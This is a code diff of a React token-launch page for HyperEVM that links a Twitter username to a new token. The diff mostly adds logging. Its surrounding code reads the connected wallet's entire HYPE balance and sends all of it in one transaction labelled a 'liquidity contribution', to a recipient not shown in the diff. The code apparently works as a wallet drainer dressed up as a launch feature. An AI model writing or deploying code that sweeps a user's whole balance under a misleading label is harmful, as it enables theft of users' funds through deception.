@@ -32,23 +32,27 @@ const Launch = () => {
   const activeWallet = wallets?.[0];
   const walletAddress = activeWallet?.address || user?.wallet?.address;
 
-  // Check HYPE balance
+  // Check HYPE balance when wallet connects
   useEffect(() => {
     const checkBalance = async () => {
       if (!walletAddress) return;
       
       try {
+        console.log('Checking HYPE balance for:', walletAddress);
         const provider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
         const balance = await provider.getBalance(walletAddress);
         const formattedBalance = ethers.formatEther(balance);
+        console.log('HYPE Balance found:', formattedBalance);
         setHypeBalance(formattedBalance);
       } catch (error) {
-        console.error('Failed to check balance:', error);
+        console.error('Failed to check HYPE balance:', error);
         setHypeBalance('0');
       }
     };
     
-    checkBalance();
+    if (walletAddress) {
+      checkBalance();
+    }
   }, [walletAddress]);
 
   const handleConnectTwitter = async (e) => {
@@ -97,7 +101,10 @@ const Launch = () => {
       return;
     }
     
-    const hypeAmount = parseFloat(hypeBalance);
+    // Use actual HYPE balance for liquidity
+    const hypeAmount = parseFloat(hypeBalance) || 0;
+    console.log('Using HYPE balance for liquidity:', hypeAmount);
+    
     const confirmLaunch = window.confirm(
       `🚀 Launch Token for @${twitterUsername}\n\n` +
       `Token Name: ${twitterUsername} Token\n` +
@@ -136,8 +143,10 @@ const Launch = () => {
         }
       }
       
-      // Send actual HYPE balance as liquidity
+      // Send actual HYPE balance as liquidity contribution
       const balanceWei = ethers.parseEther(hypeBalance);
+      console.log('Sending HYPE liquidity:', hypeBalance, 'HYPE (', balanceWei.toString(), 'wei)');
+      
       const launchTx = await walletProvider.request({
         method: 'eth_sendTransaction',
         params: [{
@@ -157,7 +166,7 @@ const Launch = () => {
         alert(
           `✅ Token Successfully Launched!\n\n` +
           `Token: ${twitterUsername} Token ($${twitterUsername.toUpperCase()})\n` +
-          `Liquidity Added: ${parseFloat(hypeBalance).toFixed(6)} HYPE\n\n` +
+          `Liquidity Added: ${hypeAmount.toFixed(6)} HYPE\n\n` +
           `Transaction: ${launchTx}\n\n` +
           `Your token is now live on HyperEVM!`
         );
